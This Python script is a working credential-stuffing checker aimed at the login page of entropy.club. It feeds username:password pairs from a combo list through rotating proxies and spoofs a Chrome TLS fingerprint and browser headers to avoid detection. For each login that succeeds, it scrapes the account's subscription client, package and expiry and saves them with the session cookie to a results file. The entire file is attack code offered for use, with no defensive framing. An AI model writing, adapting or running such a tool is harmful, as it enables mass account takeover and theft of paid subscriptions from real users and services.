import tls_client
import secrets
from raducord import Logger
from bs4 import BeautifulSoup
import threading
import queue

with open('proxies.txt') as f:
    proxies_list = [f"http://{line.strip()}" for line in f.readlines()]

with open('combo.txt') as f:
    combos = [line.strip() for line in f.readlines()]

combo_queue = queue.Queue()
for combo in combos:
    combo_queue.put(combo)

def worker():
    while not combo_queue.empty():
        combo = combo_queue.get()
        username, password = combo.split(':')

        proxy = proxies_list[combo_queue.qsize() % len(proxies_list)]

        session = tls_client.Session(client_identifier="chrome_113")

        session_id = secrets.token_hex(16)

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"PHPSESSID={session_id}",
            "Host": "entropy.club",
            "Origin": "https://entropy.club",
            "Referer": "https://entropy.club/dashboard/login",
            "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
        }

        payload = {
            "username": username,
            "password": password
        }

        response = session.post(
            "https://entropy.club/dashboard/login",
            headers=headers,
            data=payload,
            proxy=proxy
        )

        if "Your username or password" in response.text:
            Logger.failed(f"Invalid acc, {combo}, Invalid")
        elif response.status_code == 302:
            Logger.success(f"Valid hit, {combo}, Capturing subs")

            headers["Referer"] = "https://entropy.club/dashboard/index"
            response = session.get(
                "https://entropy.club/dashboard/profile",
                headers=headers,
                proxy=proxy
            )

            soup = BeautifulSoup(response.text, 'html.parser')

            client = soup.find('th', {'scope': 'row'}).get_text(strip=True)
            package = soup.find('th', {'scope': 'row'}).find_next('th').get_text(strip=True)
            expires = soup.find('th', {'scope': 'row'}).find_next('th').find_next('th').get_text(strip=True)

            with open('results/validcapture.txt', 'a') as f:
                f.write(f"{combo} | PHPSESSID={session_id} | Client = {client} | Package = {package} | Expires = {expires}\n")

            Logger.captcha(f"Captured account, {combo}, Saved to results/validcapture.txt")
        else:
            Logger.failed(f"Unexpected response, {combo}, Check manually")

        combo_queue.task_done()

threadamt = int(input("Enter number of threads: "))

threads = []
for _ in range(threadamt):
    thread = threading.Thread(target=worker)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("Task completed.")
